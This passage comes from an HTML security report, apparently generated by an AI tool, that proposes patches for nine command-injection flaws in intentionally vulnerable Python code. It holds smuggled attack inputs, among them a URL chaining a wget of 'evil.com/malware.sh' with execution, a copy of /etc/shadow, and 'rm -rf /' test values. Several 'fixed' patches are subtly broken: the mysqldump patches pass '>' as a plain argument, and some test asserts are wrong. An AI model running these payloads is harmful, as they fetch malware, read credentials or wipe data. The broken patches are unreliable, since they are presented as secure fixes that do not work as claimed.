                <h3>Patch for Command Injection</h3>

                <p><strong>üéØ Strategy:</strong> The strategy to fix this vulnerability is to avoid using shell commands with unsanitized user input. Instead, we will use Python's built-in functions and modules that provide the same functionality without the risk of command injection.</p>

                <p style="margin-top: 15px;"><strong>‚ùå Original Code:</strong></p>
                <div class="code-block"><pre>command = f"test -f {filename} && echo 'exists' || echo 'not found'"
    result = subprocess.run(command, shell=True, capture_output=True)  # VULNERABLE
    return result.stdout.decode()


def list_directory(directory):
    """
    VULNERABLE: Command injection in ls command
    """
    os.system(f"ls -la {directory}")  # VULNERABLE


def search_logs(search_term):
    """
    VULNERABLE: Command injection via grep
    """
    command = f"grep '{search_term}' /var/log/app.log"
    os.system(command)  # VULNERABLE</pre></div>

                <p style="margin-top: 15px;"><strong>‚úÖ Patched Code:</strong></p>
                <div class="code-block"><pre>import os
import glob
import re

def check_file_exists(filename):
    return os.path.isfile(filename)

def list_directory(directory):
    return os.listdir(directory)

def search_logs(search_term):
    with open('/var/log/app.log', 'r') as log_file:
        lines = log_file.readlines()
    return [line for line in lines if re.search(search_term, line)]</pre></div>

                <p style="margin-top: 15px;"><strong>üìñ Explanation:</strong> The patched code uses Python's built-in functions and modules to perform the same tasks as the original code, but without the risk of command injection. The `os.path.isfile()` function is used to check if a file exists, `os.listdir()` is used to list the contents of a directory, and the `re` module is used to search for a term in a log file. These functions do not execute shell commands, so they are not vulnerable to command injection.</p>

                
                <p style="margin-top: 15px;"><strong>üß™ Test Cases:</strong></p>
                <div class="code-block"><pre>assert check_file_exists('existing_file.txt') == True
assert check_file_exists('non_existent_file.txt') == False

assert 'file.txt' in list_directory('.')
assert 'non_existent_file.txt' not in list_directory('.')

assert 'error' in search_logs('error')
assert 'non_existent_term' not in search_logs('non_existent_term')</pre></div>
                

                
                <p style="margin-top: 15px;"><strong>üõ°Ô∏è Additional Security Measures:</strong> In addition to the above patches, it is recommended to follow these defense-in-depth measures:

1. Input Validation: Validate user input to ensure it meets the expected format and length. Reject any input that does not meet these criteria.
2. Least Privilege: Run your application with the least privileges necessary. This can limit the damage caused by a successful attack.
3. Logging and Monitoring: Implement robust logging and monitoring to detect and respond to suspicious activity.
4. Regular Updates: Keep your system and all its components up to date to ensure you have the latest security patches.
5. Security Training: Train your developers in secure coding practices to prevent similar vulnerabilities in the future.</p>
                
            </div>
            
            <div class="patch">
                <h3>Patch for Command Injection</h3>

                <p><strong>üéØ Strategy:</strong> The strategy to fix this vulnerability is to avoid using `os.system()` to execute shell commands with user-supplied input. Instead, we will use Python's built-in libraries to perform the operations. For searching logs, we will use Python's built-in file handling. For compressing files, we will use the `tarfile` module.</p>

                <p style="margin-top: 15px;"><strong>‚ùå Original Code:</strong></p>
                <div class="code-block"><pre>def search_logs(search_term):
    """
    VULNERABLE: Command injection via grep
    """
    command = f"grep '{search_term}' /var/log/app.log"
    os.system(command)  # VULNERABLE


def compress_file(filename, output):
    """
    VULNERABLE: Multiple injection points
    """
    os.system(f"tar -czf {output} {filename}")  # VULNERABLE</pre></div>

                <p style="margin-top: 15px;"><strong>‚úÖ Patched Code:</strong></p>
                <div class="code-block"><pre>import tarfile

def search_logs(search_term):
    """
    FIXED: No command injection via grep
    """
    with open('/var/log/app.log', 'r') as f:
        lines = f.readlines()
    matches = [line for line in lines if search_term in line]
    return matches


def compress_file(filename, output):
    """
    FIXED: No command injection points
    """
    with tarfile.open(output, "w:gz") as tar:
        tar.add(filename)</pre></div>

                <p style="margin-top: 15px;"><strong>üìñ Explanation:</strong> This fix works because it avoids the use of `os.system()`, which is vulnerable to command injection. Instead, it uses Python's built-in file handling to search within files and the `tarfile` module to compress files. This eliminates the possibility of command injection because there's no shell command being executed with user-supplied input.</p>

                
                <p style="margin-top: 15px;"><strong>üß™ Test Cases:</strong></p>
                <div class="code-block"><pre># Test search_logs
print(search_logs('ERROR'))  # Should print all lines containing 'ERROR'

# Test compress_file
compress_file('test.txt', 'test.tar.gz')  # Should create a compressed file 'test.tar.gz' containing 'test.txt'</pre></div>
                

                
                <p style="margin-top: 15px;"><strong>üõ°Ô∏è Additional Security Measures:</strong> - Always validate and sanitize user inputs.
- Use parameterized queries or prepared statements for database access.
- Use secure coding practices and follow the principle of least privilege.
- Regularly update and patch all systems and software.
- Use a security-focused development lifecycle that includes regular code reviews and security testing.</p>
                
            </div>
            
            <div class="patch">
                <h3>Patch for Command Injection</h3>

                <p><strong>üéØ Strategy:</strong> The strategy to fix this vulnerability is to avoid using `os.system()` and `subprocess.check_output()` with user-supplied input. Instead, we will use safer alternatives that do not allow command injection. For the tar operation, we will use the `tarfile` module as recommended. For the other commands, we will use `subprocess.run()`, which allows us to pass the command and its arguments as a list, preventing shell interpretation of special characters.</p>

                <p style="margin-top: 15px;"><strong>‚ùå Original Code:</strong></p>
                <div class="code-block"><pre>"""
command = f"grep '{search_term}' /var/log/app.log"
os.system(command)  # VULNERABLE


def compress_file(filename, output):
    """
    VULNERABLE: Multiple injection points
    """
    os.system(f"tar -czf {output} {filename}")  # VULNERABLE


def get_user_info(username):
    """
    VULNERABLE: Command injection in user lookup
    """
    command = f"id {username}"
    result = subprocess.check_output(command, shell=True)  # VULNERABLE
    return result.decode()</pre></div>

                <p style="margin-top: 15px;"><strong>‚úÖ Patched Code:</strong></p>
                <div class="code-block"><pre>import tarfile
import subprocess

def search_log(search_term):
    command = ['grep', search_term, '/var/log/app.log']
    subprocess.run(command, text=True)

def compress_file(filename, output):
    with tarfile.open(output, "w:gz") as tar:
        tar.add(filename)

def get_user_info(username):
    command = ['id', username]
    result = subprocess.run(command, capture_output=True, text=True)
    return result.stdout</pre></div>

                <p style="margin-top: 15px;"><strong>üìñ Explanation:</strong> The patched code replaces the use of `os.system()` and `subprocess.check_output()` with `subprocess.run()`, which takes the command and its arguments as a list. This prevents shell interpretation of special characters in the user-supplied input, eliminating the command injection vulnerability. For the tar operation, the `tarfile` module is used, which is a safer alternative that does not allow command injection.</p>

                
                <p style="margin-top: 15px;"><strong>üß™ Test Cases:</strong></p>
                <div class="code-block"><pre># Test search_log function
search_log('error')  # Should search for 'error' in app.log without command injection

# Test compress_file function
compress_file('test.txt', 'test.tar.gz')  # Should compress test.txt into test.tar.gz without command injection

# Test get_user_info function
get_user_info('testuser')  # Should return info for 'testuser' without command injection</pre></div>
                

                
                <p style="margin-top: 15px;"><strong>üõ°Ô∏è Additional Security Measures:</strong> - Always validate and sanitize user input before using it in any system command.
- Use least privilege principle. Run your application with the least privileges necessary.
- Regularly update and patch all systems and libraries to protect against known vulnerabilities.
- Use a security-focused development lifecycle that includes regular code reviews and security testing.</p>
                
            </div>
            
            <div class="patch">
                <h3>Patch for Command Injection</h3>

                <p><strong>üéØ Strategy:</strong> The strategy to fix this vulnerability is to avoid using shell=True in subprocess calls and to sanitize user inputs. We will use shlex to split the command string into a list of arguments, which will prevent command injection. For the os.system calls, we will replace them with subprocess calls as well, following the same strategy.</p>

                <p style="margin-top: 15px;"><strong>‚ùå Original Code:</strong></p>
                <div class="code-block"><pre>command = f"id {username}"
result = subprocess.check_output(command, shell=True)  # VULNERABLE
return result.decode()

def download_file(url, destination):
    """
    VULNERABLE: Command injection in wget/curl
    """
    os.system(f"wget {url} -O {destination}")  # VULNERABLE

def backup_database(db_name, backup_path):
    """
    VULNERABLE: Command injection in database backup
    """
    command = f"mysqldump -u root {db_name} > {backup_path}"
    os.system(command)  # VULNERABLE</pre></div>

                <p style="margin-top: 15px;"><strong>‚úÖ Patched Code:</strong></p>
                <div class="code-block"><pre>import shlex

command = shlex.split(f"id {shlex.quote(username)}")
result = subprocess.check_output(command, shell=False)
return result.decode()

def download_file(url, destination):
    """
    FIXED: Command injection in wget/curl
    """
    command = shlex.split(f"wget {shlex.quote(url)} -O {shlex.quote(destination)}")
    subprocess.run(command, shell=False)

def backup_database(db_name, backup_path):
    """
    FIXED: Command injection in database backup
    """
    command = shlex.split(f"mysqldump -u root {shlex.quote(db_name)} > {shlex.quote(backup_path)}")
    subprocess.run(command, shell=False)</pre></div>

                <p style="margin-top: 15px;"><strong>üìñ Explanation:</strong> This fix works by using shlex to split the command string into a list of arguments, which prevents command injection. The shlex.quote function is used to properly escape any special characters in the user inputs. This way, even if a user tries to inject commands, they will be treated as part of the argument string and not as separate commands. The shell=False argument in the subprocess calls ensures that the command is not run through a shell, further preventing command injection.</p>

                
                <p style="margin-top: 15px;"><strong>üß™ Test Cases:</strong></p>
                <div class="code-block"><pre># Test with normal inputs
username = "testuser"
url = "http://example.com/file.txt"
destination = "/tmp/file.txt"
db_name = "testdb"
backup_path = "/tmp/backup.sql"

# Test with command injection attempts
username = "testuser; rm -rf /"
url = "http://example.com/file.txt; rm -rf /"
destination = "/tmp/file.txt; rm -rf /"
db_name = "testdb; DROP DATABASE testdb"
backup_path = "/tmp/backup.sql; rm -rf /"</pre></div>
                

                
                <p style="margin-top: 15px;"><strong>üõ°Ô∏è Additional Security Measures:</strong> - Use a web application firewall (WAF) to filter out malicious inputs.
- Use a least privilege policy for the database and system users.
- Regularly update and patch all systems and software to fix known vulnerabilities.
- Use input validation libraries to further sanitize user inputs.
- Implement a secure coding training program for developers to understand the risks and mitigation techniques for common vulnerabilities like command injection.</p>
                
            </div>
            
            <div class="patch">
                <h3>Patch for Command Injection</h3>

                <p><strong>üéØ Strategy:</strong> The strategy is to replace the use of `os.system` and `subprocess.run` with safer alternatives that do not allow command injection. For downloading files, we will use the `requests` library. For the database backup and image processing, we will use `subprocess.run` with a list of arguments instead of a string command. This prevents shell interpretation of the command.</p>

                <p style="margin-top: 15px;"><strong>‚ùå Original Code:</strong></p>
                <div class="code-block"><pre>"""
os.system(f"wget {url} -O {destination}")  # VULNERABLE


def backup_database(db_name, backup_path):
    """
    VULNERABLE: Command injection in database backup
    """
    command = f"mysqldump -u root {db_name} > {backup_path}"
    os.system(command)  # VULNERABLE


def process_image(image_path, output_path):
    """
    VULNERABLE: Command injection in image processing
    """
    command = f"convert {image_path} -resize 800x600 {output_path}"
    subprocess.run(command, shell=True)  # VULNERABLE</pre></div>

                <p style="margin-top: 15px;"><strong>‚úÖ Patched Code:</strong></p>
                <div class="code-block"><pre>import requests
import subprocess

def download_file(url, destination):
    response = requests.get(url)
    with open(destination, 'wb') as file:
        file.write(response.content)

def backup_database(db_name, backup_path):
    command = ["mysqldump", "-u", "root", db_name, ">", backup_path]
    subprocess.run(command, shell=False)

def process_image(image_path, output_path):
    command = ["convert", image_path, "-resize", "800x600", output_path]
    subprocess.run(command, shell=False)</pre></div>

                <p style="margin-top: 15px;"><strong>üìñ Explanation:</strong> The patched code uses the `requests` library to download files, which does not allow command injection. For the database backup and image processing, we use `subprocess.run` with a list of arguments instead of a string command. This prevents shell interpretation of the command, which could allow command injection.</p>

                
                <p style="margin-top: 15px;"><strong>üß™ Test Cases:</strong></p>
                <div class="code-block"><pre># Test download_file
download_file('http://example.com/file.txt', '/path/to/file.txt')
# Check that file.txt is downloaded to /path/to/file.txt

# Test backup_database
backup_database('my_database', '/path/to/backup.sql')
# Check that backup.sql is created at /path/to/backup.sql

# Test process_image
process_image('/path/to/image.jpg', '/path/to/output.jpg')
# Check that output.jpg is created at /path/to/output.jpg</pre></div>
                

                
                <p style="margin-top: 15px;"><strong>üõ°Ô∏è Additional Security Measures:</strong> - Use parameterized queries or ORM for database operations to prevent SQL injection.
- Use a web application firewall (WAF) to block known malicious inputs.
- Regularly update all libraries and dependencies to their latest versions.
- Implement proper error handling and logging to detect and respond to security incidents.
- Limit the permissions of the application to only what is necessary for its operation.
- Use secure coding practices and conduct regular code reviews to detect potential security issues.</p>
                
            </div>
            
            <div class="patch">
                <h3>Patch for Command Injection</h3>

                <p><strong>üéØ Strategy:</strong> The strategy to fix this vulnerability is to sanitize the user input before it is used in any command. We will use Python's `subprocess` module to execute the commands, which allows us to pass the arguments as a list, thus preventing shell injection. We will also validate the URL before downloading the file.</p>

                <p style="margin-top: 15px;"><strong>‚ùå Original Code:</strong></p>
                <div class="code-block"><pre>output = "backup.tar.gz; cp /etc/shadow /tmp/shadow.txt"
compress_file("data/", output)
Result: Creates backup, then copies shadow file

url = "http://example.com/file.txt; wget http://evil.com/malware.sh -O /tmp/m.sh; chmod +x /tmp/m.sh; /tmp/m.sh"
download_file(url, "/tmp/file.txt")
Result: Downloads and executes malware</pre></div>

                <p style="margin-top: 15px;"><strong>‚úÖ Patched Code:</strong></p>
                <div class="code-block"><pre>import subprocess
import urllib.parse

def compress_file(input_dir, output_file):
    subprocess.run(["tar", "-czf", output_file, input_dir], check=True)

def download_file(url, destination):
    parsed_url = urllib.parse.urlparse(url)
    if parsed_url.scheme not in ('http', 'https'):
        raise ValueError("Invalid URL scheme")
    subprocess.run(["wget", "-O", destination, url], check=True)

output = "backup.tar.gz"
compress_file("data/", output)

url = "http://example.com/file.txt"
download_file(url, "/tmp/file.txt")</pre></div>

                <p style="margin-top: 15px;"><strong>üìñ Explanation:</strong> The patched code uses the `subprocess.run()` function to execute the commands. This function takes a list of arguments, which are passed directly to the command, without going through a shell. This prevents shell injection, as the arguments are not interpreted by the shell.

The `download_file()` function now validates the URL scheme before downloading the file. This prevents an attacker from using a different protocol to download malicious files.</p>

                
                <p style="margin-top: 15px;"><strong>üß™ Test Cases:</strong></p>
                <div class="code-block"><pre># Test compress_file function
compress_file("data/", "backup.tar.gz")
# Check if backup.tar.gz file is created

# Test download_file function with valid URL
download_file("http://example.com/file.txt", "/tmp/file.txt")
# Check if /tmp/file.txt is created

# Test download_file function with invalid URL
try:
    download_file("ftp://example.com/file.txt", "/tmp/file.txt")
except ValueError as e:
    assert str(e) == "Invalid URL scheme"</pre></div>
                

                
                <p style="margin-top: 15px;"><strong>üõ°Ô∏è Additional Security Measures:</strong> - Use a least-privilege user for the application, so it doesn't have permissions to execute dangerous commands or access sensitive files.
- Use a Web Application Firewall (WAF) to filter out malicious inputs.
- Regularly update and patch all software to fix known vulnerabilities.
- Use a static code analyzer to detect potential security issues in the code.
- Implement a secure coding training program for developers to understand and avoid common security vulnerabilities.</p>
                
            </div>
            
            <div class="patch">
                <h3>Patch for Command Injection</h3>

                <p><strong>üéØ Strategy:</strong> The strategy to fix this vulnerability is to replace the usage of `os.system()` with a dedicated image processing library, such as PIL (Pillow). This will prevent command injection as we will no longer be executing shell commands. We will also sanitize the user input to ensure that it is a valid file path.</p>

                <p style="margin-top: 15px;"><strong>‚ùå Original Code:</strong></p>
                <div class="code-block"><pre>import os

def process_image(image_path):
    os.system(f"convert {image_path} -resize 200x200 processed_image.jpg")

if __name__ == "__main__":
    print("WARNING: This code contains intentional command injection vulnerabilities!")
    print("For educational purposes only!")
    print("\nNEVER use shell=True or os.system() with user input in production!")
    image_path = input("Enter the path of the image to process: ")
    process_image(image_path)</pre></div>

                <p style="margin-top: 15px;"><strong>‚úÖ Patched Code:</strong></p>
                <div class="code-block"><pre>from PIL import Image
import os

def process_image(image_path):
    if not os.path.isfile(image_path):
        raise ValueError(f"No such file: '{image_path}'")
    with Image.open(image_path) as img:
        img.thumbnail((200, 200))
        img.save("processed_image.jpg")

if __name__ == "__main__":
    image_path = input("Enter the path of the image to process: ")
    try:
        process_image(image_path)
    except ValueError as e:
        print(e)</pre></div>

                <p style="margin-top: 15px;"><strong>üìñ Explanation:</strong> This fix works because it replaces the usage of `os.system()` with the Pillow library, which is a dedicated image processing library. This prevents command injection because we are no longer executing shell commands. Additionally, the user input is sanitized by checking if the provided image path is a valid file path.</p>

                
                <p style="margin-top: 15px;"><strong>üß™ Test Cases:</strong></p>
                <div class="code-block"><pre># Test with a valid image path
process_image("test.jpg") # should resize the image and save it as processed_image.jpg

# Test with an invalid image path
process_image("non_existent.jpg") # should raise ValueError: No such file: 'non_existent.jpg'</pre></div>
                

                
                <p style="margin-top: 15px;"><strong>üõ°Ô∏è Additional Security Measures:</strong> - Always validate and sanitize user input. In this case, we are checking if the provided image path is a valid file path.
- Use dedicated libraries for specific tasks instead of executing shell commands. In this case, we are using the Pillow library for image processing.
- Regularly update your libraries to the latest versions to get the latest security patches.
- Consider using a static code analysis tool to automatically detect common security vulnerabilities in your code.</p>
                
            </div>
            
        </div>
        

        <div class="footer">
            <p style="font-size: 1.1em; margin-bottom: 10px;">
                <strong>Generated by VulnDetective</strong> - AI-Powered Vulnerability Detection System
            </p>
            <p style="margin-bottom: 10px;">
                Featuring: GitHub URL Fetching ‚Ä¢ CVSS 3.1 Scoring ‚Ä¢ Interactive AI Assistant ‚Ä¢ Advanced Visualization
            </p>
            <p style="color: #999;">
                ¬© 2025 VulnDetective Team | Report generated on 2025-10-31 21:02:11
            </p>
        </div>
    </div>

    <script>
        // Chart.js Ï∞®Ìä∏ ÏÉùÏÑ±
        const severityData = {"labels": ["Critical", "High", "Medium", "Low"], "values": [9, 0, 0, 0]};
        const typeData = {"labels": ["Command Injection"], "values": [9]};
        const cvssData = {"labels": ["Vuln 1", "Vuln 2", "Vuln 3", "Vuln 4", "Vuln 5", "Vuln 6", "Vuln 7", "Vuln 8", "Vuln 9"], "values": [8.7, 8.7, 8.7, 8.7, 8.7, 8.7, 8.7, 8.7, 8.7]};

        // Severity Distribution Chart
        new Chart(document.getElementById('severityChart'), {
            type: 'doughnut',
            data: {
                labels: severityData.labels,
                datasets: [{
                    data: severityData.values,
                    backgroundColor: [
                        '#dc2626',  // Critical
                        '#ea580c',  // High
                        '#facc15',  // Medium
                        '#3b82f6',  // Low
                    ],
                    borderWidth: 2,
                    borderColor: '#fff'
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: {
                        position: 'bottom',
                        labels: { font: { size: 12 } }
                    }
                }
            }
        });

        // Vulnerability Types Chart
        new Chart(document.getElementById('typeChart'), {
            type: 'bar',
            data: {
                labels: typeData.labels,
                datasets: [{
                    label: 'Count',
                    data: typeData.values,
                    backgroundColor: 'rgba(102, 126, 234, 0.8)',
                    borderColor: 'rgba(102, 126, 234, 1)',
                    borderWidth: 2
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                plugins: {
                    legend: { display: false }
                },
                scales: {
                    y: {
                        beginAtZero: true,
                        ticks: { stepSize: 1 }
                    }
                }
            }
        });

        // CVSS Distribution Chart
        new Chart(document.getElementById('cvssChart'), {
            type: 'line',
            data: {
                labels: cvssData.labels,
                datasets: [{
                    label: 'CVSS Score',
                    data: cvssData.values,
                    borderColor: 'rgba(102, 126, 234, 1)',
                    backgroundColor: 'rgba(102, 126, 234, 0.1)',
                    fill: true,
                    tension: 0.4,
                    pointRadius: 5,
                    pointBackgroundColor: 'rgba(102, 126, 234, 1)'
                }]
            },
            options: {
                responsive: true,
                maintainAspectRatio: false,
                scales: {
                    y: {
                        beginAtZero: true,
                        max: 10
                    }
                }
            }
        });
    </script>
</body>
</html>